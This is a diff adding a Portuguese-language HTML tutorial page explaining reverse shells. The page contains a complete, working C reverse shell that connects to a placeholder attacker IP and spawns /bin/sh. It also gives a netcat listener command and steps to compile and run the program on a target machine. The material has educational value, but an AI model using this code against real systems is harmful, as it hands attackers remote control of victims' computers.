@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/css/basepaper.css">
+    <title>Reverse Shell</title>
+</head>
+<body>
+    <h1>O que é um Reverse Shell?</h1>
+    <p>Um reverse shell é como uma "porta dos fundos" que permite a alguém controlar seu computador remotamente. Em vez de o atacante tentar se conectar ao seu computador, ele faz com que seu computador se conecte de volta a ele. Isso é útil porque firewalls geralmente bloqueiam conexões de entrada, mas permitem conexões de saída.</p>
+
+    <h2>Como funciona um Reverse Shell?</h2>
+    <ol>
+        <li><strong>Atacante espera a conexão</strong>: O atacante coloca sua máquina para escutar uma conexão.</li>
+        <li><strong>Alvo conecta de volta</strong>: A máquina alvo (a vítima) se conecta de volta à máquina do atacante.</li>
+        <li><strong>Controle remoto</strong>: Agora, o atacante pode enviar comandos para a máquina alvo e controlá-la.</li>
+        <li><strong>Shell</strong>: permite executar comandos, outros programas, serviços e até mesmo outros shells para que o usuário execute ações sobre o sistema operacional</li>
+    </ol>
+
+    <h4>Exemplo prático: Como fazer um Reverse Shell em C</h2>
+    <p>Vamos ver como fazer um reverse shell simples em C.</p>
+
+    <h4>Passo 1: Atacante escuta a conexão</h3>
+    <p>No computador do atacante, vamos usar Netcat para escutar a conexão.</p>
+    <pre><code># No computador do atacante
+nc -lvp 4444
+    </code></pre>
+    <p>Este comando faz o Netcat escutar na porta 4444.</p>
+
+    <h4>Passo 2: Código C para o Reverse Shell</h3>
+    <p>Aqui está um código simples em C para criar um reverse shell. Este código faz com que o computador alvo se conecte de volta ao atacante.</p>
+    <pre><code>#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;arpa/inet.h&gt;
+#include &lt;sys/socket.h&gt;
+
+int main() {
+    int sockfd;
+    struct sockaddr_in attacker_addr;
+
+    // Cria um socket
+    sockfd = socket(AF_INET, SOCK_STREAM, 0);
+
+    // Configura o endereço do atacante
+    attacker_addr.sin_family = AF_INET;
+    attacker_addr.sin_port = htons(4444); // Porta do atacante
+    attacker_addr.sin_addr.s_addr = inet_addr("ATACANTE_IP"); // IP do atacante
+
+    // Conecta ao atacante
+    connect(sockfd, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr));
+
+    // Redireciona stdin, stdout, stderr para o socket
+    dup2(sockfd, 0);
+    dup2(sockfd, 1);
+    dup2(sockfd, 2);
+
+    // Executa uma shell
+    execve("/bin/sh", NULL, NULL);
+
+    return 0;
+}
+    </code></pre>
+
+    <h3>Passo 3: Compilar e executar o código</h3>
+    <p>Compile o código em C no computador alvo:</p>
+    <pre><code>gcc -o reverse_shell reverse_shell.c
+    </code></pre>
+    <p>Depois, execute o programa compilado:</p>
+    <pre><code>./reverse_shell
+    </code></pre>
+    <p>Assim que o programa for executado no computador alvo, ele se conectará de volta ao computador do atacante. No Netcat, você verá que a conexão foi estabelecida, e você terá controle da máquina alvo.</p>
+
+</body>
+</html>
